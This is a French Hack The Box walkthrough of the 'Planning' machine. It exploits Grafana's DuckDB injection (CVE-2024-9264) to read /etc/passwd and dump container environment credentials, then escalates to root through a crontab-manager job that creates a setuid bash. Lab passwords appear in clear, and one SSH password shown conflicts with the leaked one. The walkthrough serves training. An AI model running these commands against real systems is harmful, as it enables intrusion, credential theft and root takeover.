# HTB — Planning · Linux · Easy

**IP :** `10.10.11.68` &nbsp;|&nbsp; **Outils :** nmap · nuclei · ffuf · gobuster · CVE-2024-9264 · ssh

> **Credentials fournis au départ :** `admin / 0D5oT70Fq13EvB5r`

---

## Contexte

> La machine expose une instance **Grafana v11.0.0** vulnérable à une injection DuckDB (CVE-2024-9264). L'exploitation permet de lire des fichiers et d'exécuter des commandes, ce qui mène à des credentials SSH. L'escalade de privilèges passe par un cronjob accessible via un tunnel SSH.

---

## Reconnaissance

### Scan de ports

```bash
nmap -p- -sC -sV -O 10.10.11.68
```

```
22/tcp  open  ssh    OpenSSH 9.6p1 Ubuntu
80/tcp  open  http   nginx 1.24.0
```

Le port 80 redirige vers `http://planning.htb/`. On ajoute l'entrée dans `/etc/hosts`.

### Virtual Host Fuzzing

```bash
ffuf -c -w namelist.txt -H 'Host: FUZZ.planning.htb' \
     -u http://10.10.11.68 -fc 301
```

```
grafana   [Status: 302, Size: 29]
```

Sous-domaine `grafana.planning.htb` découvert. On ajoute l'entrée dans `/etc/hosts`.

### Identification de la version Grafana

```bash
curl -s "http://grafana.planning.htb/login" | grep -i version
# "version":"11.0.0"
```

Grafana **v11.0.0** — vulnérable à CVE-2024-9264.

---

## Exploitation — CVE-2024-9264 (Grafana DuckDB RCE)

CVE-2024-9264 permet à un utilisateur authentifié d'injecter des requêtes DuckDB via le moteur de datasource, ce qui permet de **lire des fichiers arbitraires** et d'**exécuter des commandes système**.

```bash
git clone https://github.com/nollium/CVE-2024-9264.git
cd CVE-2024-9264
```

### Lecture de fichiers

```bash
python3 CVE-2024-9264.py \
  -u admin -p 0D5oT70Fq13EvB5r \
  -f /etc/passwd \
  http://grafana.planning.htb
```

```
root:x:0:0:root:/root:/bin/bash
...
grafana:x:472:0::/home/grafana:/usr/sbin/nologin
```

### Extraction des variables d'environnement

Le container Docker contient les credentials admin dans ses variables d'env :

```bash
python3 CVE-2024-9264.py \
  -u admin -p 0D5oT70Fq13EvB5r \
  -c "env" \
  http://grafana.planning.htb
```

```
GF_SECURITY_ADMIN_USER=enzo
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
```

### Connexion SSH

```bash
ssh enzo@10.10.11.68
# Password: whoami!

cat ~/user.txt
# user_flag{*********************************}
```

---

## Escalade de privilèges

### Découverte du crontab manager

```bash
netstat -tulnp
# 127.0.0.1:8000   LISTEN
```

Un service tourne en local sur le port 8000. Exploration du système de fichiers :

```bash
cat /opt/crontabs/crontab.db
```

```json
{"name":"Grafana backup","command":"...zip -P P4ssw0rdS0pRi0T3c ...","schedule":"@daily",...}
```

Le mot de passe `P4ssw0rdS0pRi0T3c` est en clair dans la base du crontab manager.

### Tunnel SSH

```bash
ssh -L 8000:127.0.0.1:8000 -N -f enzo@planning.htb
```

On accède à l'UI du crontab manager sur `http://127.0.0.1:8000` avec :

```
Login : root
Password : P4ssw0rdS0pRi0T3c
```

### Injection de cronjob malveillant

Dans l'interface web, on ajoute un nouveau job avec la commande :

```bash
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
```

Après exécution du cronjob (fréquence : `* * * * *`) :

```bash
/tmp/rootbash -p

rootbash-5.2# cat /root/root.txt
# root_flag{*********************************}
```

---

## Flags

```
user.txt  →  user_flag{*********************************}
root.txt  →  root_flag{*********************************}
```

---

## Ce que j'ai retenu

**Les variables d'environnement Docker fuient souvent des secrets.** La commande `env` dans un container expose régulièrement des credentials en clair — à toujours tenter en cas de RCE dans un container.

**Un tunnel SSH ouvre des services invisibles.** `netstat -tulnp` côté serveur révèle des ports internes inaccessibles depuis l'extérieur. Un tunnel SSH les rend accessibles localement en une commande.

**Les fichiers de config contiennent des mots de passe en clair.** `/opt/crontabs/crontab.db` stockait le password root sans chiffrement. Explorer `/opt`, `/var`, et `/etc` après accès SSH est systématique.

---

## Ressources

- [CVE-2024-9264 — Exploit Python](https://github.com/nollium/CVE-2024-9264)
- [Grafana Security Advisory](https://grafana.com/security/security-advisories/)
- [HackTricks — Tunneling SSH](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding)
